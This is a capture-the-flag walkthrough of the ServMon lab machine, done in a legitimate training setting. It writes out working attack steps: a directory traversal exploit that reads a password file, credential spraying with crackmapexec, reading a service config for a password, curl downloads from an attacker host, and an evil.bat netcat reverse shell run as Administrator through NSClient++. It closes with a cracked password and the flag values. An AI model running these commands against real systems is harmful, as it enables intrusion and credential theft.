# ServMon - Easy

```shell
nmap -T4 -p- -A -Pn -v servmon.htb

ftp servmon.htb
#anonymous login

#get both files

#get directory traversal exploit
python nvms.py

python nvms.py servmon.htb Windows/win.ini

python nvms.py servmon.htb Users/nathan/Desktop/Passwords.txt
#get possible passwords

vim usernames.txt
#nathan and nadine

vim passwords.txt
#from Passwords.txt

crackmapexec smb -u usernames.txt -p passwords.txt --shares servmon.htb --continue-on-success
#gives correct password for nadine

ssh nadine@servmon.htb

type Desktop\user.txt

netstat -ano
#shows listening port at 8443
#running nsclient++

#ssh routing
ssh -L 8443:127.0.0.1:8443 nadine@servmon.htb

#get nsclient password
type "C:\Program Files\nsclient++\nsclient.ini"

#we can use password to login into localhost:8443

#in attacker machine
echo "C:\ProgramData\nc.exe 10.10.14.3 6666 -e cmd.exe" > evil.bat

python3 -m http.server

#in ssh session
cd C:\ProgramData

curl http://10.10.14.3:8000/nc64.exe -o nc.exe

curl http://10.10.14.3:8000/evil.bat -o evil.bat

#now we can setup the scripts and schedules
#in nsclient++ interface
#according to given exploit

#in attacker machine
nc -nvlp 6666
#after script executes, we get shell as Administrator
```

* Open ports & services:

  * 21 - ftp - Microsoft ftpd
  * 22 - ssh - OpenSSH for Windows 8.0
  * 80 - http
  * 135 - msrpc - Microsoft Windows RPC
  * 139 - netbos-ssn - netbios-ssn
  * 445 - microsoft-ds
  * 5666 - tcpwrapped
  * 6063 - tcpwrapped
  * 6699 - napster
  * 8443 - ssl/https-alt
  * 49664-49670 - msrpc - msrpc

* Starting with ```ftp``` enum, we can login using anonymous mode.

* There are two .txt files - both contain general notes for the users 'Nathan' and 'Nadine'.

* The notes also suggest that the public access to NVMS has not been removed yet.

* Checking the webpage on port 80, we can see that it is for ```NVMS-1000```

* Using ```searchsploit```, we can see that there are directory traversal exploits for ```NVMS-1000```.

* We can get the exploit script from Github and run it to read files such as ```win.ini```

* Now, from the note earlier, it was given that Nathan's Desktop contains Passwords.txt - we can attempt to read this using the exploit.

* We are able to read Passwords.txt in this way - this gives us multiple passwords.

* We can attempt to brute-force logging into the system using the usernames and passwords enumerated so far.

* With the help of ```crackmapexec```, we get the creds "nadine:L1k3B1gBut7s@W0rk"

* We can now log into SSH as nadine, and get user flag.

* Now, earlier through ```nmap```, we enumerated ```NSClient++``` on port 8443 (SSL/HTTPS).

* We can confirm this using ```netstat -ano``` - the Windows machine is listening on port 8443, and this service can be accessed internally only.

* So, using ```SSH routing```, we can setup port forwarding such that we can access the service on our localhost at port 8443.

* Now, searching for exploits related to ```NSClient++``` give us a couple of manual exploits.

* For the exploit, in our SSH session, we need to get two files from our attacker machine - ```nc64.exe``` and ```evil.bat```

* The ```evil.bat``` file is for launching a ```nc``` connection to the attacker machine, for a reverse shell.

* Now, after this, we need to visit <https://localhost:8443> to go to the NSClient++ interface.

* The password required for login can be found in the file ```C:\Program Files\nsclient++\nsclient.ini```

* Once we log in, we have to create a script to call ```evil.bat```:

  ```Settings > External Scripts > Scripts > Add New```
  ```foobar - command = C:\\ProgramData\\evil.bat```

* We also need to create a schedule which calls the script every minute:

  ```Settings > Scheduler > Schedules > Add New```
  ```foobar - interval = 1m```
  ```foobar - command = foobar```

* Setup a listener on attacker machine, and wait for a moment - this setting up of scripts and schedules may require multiple attempts.

* After a while, we get reverse shell on our listener as Administrator, and we can read root flag.

```markdown
1. User flag - 8287a10a9f74a9586a552c49450fb8d3

2. Root flag - 127218e211e64c5f95193692973787ce
```
